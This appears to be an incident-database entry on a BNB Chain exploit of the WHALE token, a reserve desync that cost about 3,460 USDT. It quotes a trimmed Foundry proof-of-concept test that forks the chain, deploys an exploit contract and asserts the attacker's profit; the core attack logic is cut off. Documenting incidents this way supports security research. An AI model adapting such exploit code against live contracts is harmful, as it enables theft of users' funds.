# [?] WHALE - Transfer Accounting Reserve Desync

## Summary
Severity: Unknown
Chain: BNB Chain
Component: WHALE
Published: 2026-06-17
Source: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2026-06/WHALE_exp.sol
Type: defi-exploit-poc

## Details
Lost: 3,460.41 USDT

```solidity
contract ContractTest is BaseTestWithBalanceLog {
    function setUp() public {
        vm.createSelectFork("bsc", 104_744_230);
        fundingToken = USDT_TOKEN;

        vm.label(ATTACKER, "Attacker EOA");
        vm.label(WHALE_TOKEN, "WHALE");
        vm.label(USDT_TOKEN, "USDT");
        vm.label(WHALE_USDT_PAIR, "WHALE/USDT Pancake pair");
        vm.label(WHALE_HASHRATE, "WHALEHashrate");
        vm.label(POL_VAULT, "PolVault");
        vm.label(PANCAKE_INFINITY_VAULT, "Pancake Infinity Vault");
        vm.label(MOOLAH_PROXY, "Moolah proxy");
    }

    function testExploit() public balanceLog2(ATTACKER) {
        uint256 attackerBefore = IERC20(USDT_TOKEN).balanceOf(ATTACKER);
        uint256 flashAmount = 7_772_960_679_833_989_887_601_242;

        vm.startPrank(ATTACKER, ATTACKER);
        WHALEExploit exploit = new WHALEExploit(ATTACKER);
        exploit.attack(flashAmount);
        vm.stopPrank();

        uint256 profit = IERC20(USDT_TOKEN).balanceOf(ATTACKER) - attackerBefore;
        logTokenBalance(USDT_TOKEN, ATTACKER, "Attacker Final");
        assertGt(profit, 3400 ether, "USDT profit after both repayments");
    }
}

contract WHALEExploit {
    IERC20 private constant usdt = IERC20(USDT_TOKEN);
    IERC20 private constant wbnb = IERC20(WBNB_TOKEN);
    IERC20 private constant whale = IERC20(WHALE_TOKEN);
    IPancakePair private constant pair = IPancakePair(WHALE_USDT_PAIR);
```

_Trimmed to 38 lines — full report: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2026-06/WHALE_exp.sol_
